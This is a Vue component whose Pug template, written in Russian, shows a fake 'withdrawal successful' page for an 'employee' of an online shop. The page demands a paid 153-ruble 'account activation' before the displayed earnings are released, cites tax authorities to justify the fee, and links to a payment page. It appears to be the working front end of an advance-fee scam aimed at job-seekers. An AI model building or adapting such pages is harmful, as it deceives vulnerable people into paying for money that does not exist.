<template lang='pug'>
    .transfer
        .transfer__view Вы успешно заказали вывод средств!
            span {{Cash.available}} руб. ({{(Cash.available / Cash.course).toFixed(2)}}$)

        .transfer__text
            .transfer__t1 Уважаемый сотрудник {{User.login}}

            p.transfer__t2 Вы успешно заказали вывод денежных средств в размере 
                span.blue {{Cash.available}} руб. Вывод средств будет произведён на указанный Вами счёт сразу же после активации аккаунта.

            p.transfer__t2 Процедура необходима для уточнения автоматически созданных регистрационных данных и безопасного автовывода денежных средств при дальнейшем сотрудничестве.

            p.transfer__t2 Также в случае обращения к нам налоговых органов, мы обязаны предоставить официальную информацию о всех сотрудниках, работающих в нашем интернет магахине и получающих доход.

            p.transfer__t2 После выплаты моментально на вашу карту или электронный кошелек без повторной активации.

            p.transfer__t2 Процедура активации являтся платной!

            p.transfer__t2 Стоимость услуги активации аккаунта: 
                span.red 153 
                | рубля.

            p.transfer__t2 После оплаты эта сумма будет моментально зачислена на Ваш персональный счет!

        router-link(:to="{ name: 'payment' }").transfer__submit.link ПРОИЗВЕСТИ АКТИВАЦИЮ АККАУНТА 
</template>

<script src='./script.js'></script>

<style lang='scss' src='./style.scss' scoped></style>